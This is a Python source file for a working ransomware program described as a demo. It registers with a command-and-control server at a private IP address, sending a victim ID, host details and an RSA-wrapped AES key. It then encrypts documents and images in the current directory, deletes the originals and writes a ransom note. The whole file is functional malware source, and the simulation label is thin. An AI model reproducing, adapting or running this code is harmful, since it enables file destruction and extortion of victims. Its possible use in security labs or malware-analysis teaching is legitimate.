import os
import base64
import requests
import socket
import getpass
import platform
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import uuid

# Public key will be inserted by payload_builder
PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyMI92lvJwNyQ+Vayc8i/
zK45hk0soe+eISgp05SO9J2P9cfX7Z6cezBXqpm4WAMhphrG54n99TVAQ9Bcuqm9
CDyesXXUwZczimbPeYIFy6DOatpib86mYIcL7D+sVMSt6d2QdOwdEAN0SS+HrGmO
zxepdUkd9NRB8aBDV5L9OAkqUrYyCu3XzXaiDAoV0hBt6EXi0iwyTIn3Q1rvra4s
UmHYghUPmouv17JfeZ8SrsP9bShCRn3PloIPC/kLTGnDrYNsIH2GnSVCC4ee/bUc
koCMoePEJJjKfa4EnM7cVesAKsaRMm//zxvfNP/qA419HNbzcSYfvG/tTH2P2Z0q
4wIDAQAB
-----END PUBLIC KEY-----
'''

class SimpleRansomware:
    def __init__(self):
        self.c2_url = f"http://192.168.80.134:5000/register"
        self.victim_id = str(uuid.uuid4())[:8]
        self.aes_key = os.urandom(32)
        self.public_key = self.load_key()
        
    def load_key(self):
        return serialization.load_pem_public_key(
            PUBLIC_KEY.encode(),
            backend=default_backend()
        )
    
    def register_with_c2(self):
        encrypted_key = self.public_key.encrypt(
            self.aes_key,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), 
                        algorithm=hashes.SHA256(), label=None)
        )
        
        data = {
            'id': self.victim_id,
            'os': platform.platform(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'files': 0,
            'key': base64.b64encode(encrypted_key).decode()
        }
        
        try:
            response = requests.post(self.c2_url, json=data, timeout=5)
            if response.status_code == 200:
                print(f"[+] Registered with C2: {self.victim_id}")
                return True
        except Exception as e:
            print(f"[-] C2 offline: {e}")
        
        return False
    
    def encrypt_test_files(self):
        """Encrypt files in current directory for demo"""
        test_files = []
        
        # Look for .txt, .docx, .jpg files
        for f in os.listdir('.'):
            if f.endswith(('.txt', '.docx', '.jpg', '.png', '.pdf')) and not f.startswith('.'):
                test_files.append(f)
        
        if not test_files:
            # Create test files
            for i in range(3):
                filename = f"test_document_{i}.txt"
                with open(filename, 'w') as f:
                    f.write(f"This is test document {i}\n")
                test_files.append(filename)
        
        # Encrypt files
        for filename in test_files:
            try:
                with open(filename, 'rb') as f:
                    data = f.read()
                
                iv = os.urandom(16)
                cipher = Cipher(algorithms.AES(self.aes_key), modes.CFB(iv))
                encryptor = cipher.encryptor()
                encrypted = encryptor.update(data) + encryptor.finalize()
                
                with open(filename + '.locked', 'wb') as f:
                    f.write(iv + encrypted)
                
                os.remove(filename)
                print(f"[+] Encrypted: {filename}")
            except Exception as e:
                print(f"[-] Failed: {filename} - {e}")
        
        return len(test_files)
    
    def create_ransom_note(self):
        note = f"""
        ⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️
        
        To recover your files, contact the attacker.
        
        Your Victim ID: {self.victim_id}
        
        Don't try to decrypt files yourself!
        """
        
        with open("READ_ME.txt", "w") as f:
            f.write(note)
        
        print("[+] Ransom note created: READ_ME.txt")
    
    def run(self):
        print("🔒 Starting ransomware simulation...")
        print(f"Victim ID: {self.victim_id}")
        
        # Register with C2
        if not self.register_with_c2():
            print("[!] Warning: Could not contact C2 server")
        
        # Encrypt files
        count = self.encrypt_test_files()
        print(f"[+] Encrypted {count} files")
        
        # Create ransom note
        self.create_ransom_note()
        
        # Clean up key
        self.aes_key = b'0' * 32
        
        print("\n" + "="*50)
        print("Ransomware simulation complete!")
        print(f"Share this ID with attacker: {self.victim_id}")
        print("="*50)
        
        input("\nPress Enter to exit...")

if __name__ == "__main__":
    ransomware = SimpleRansomware()
    ransomware.run()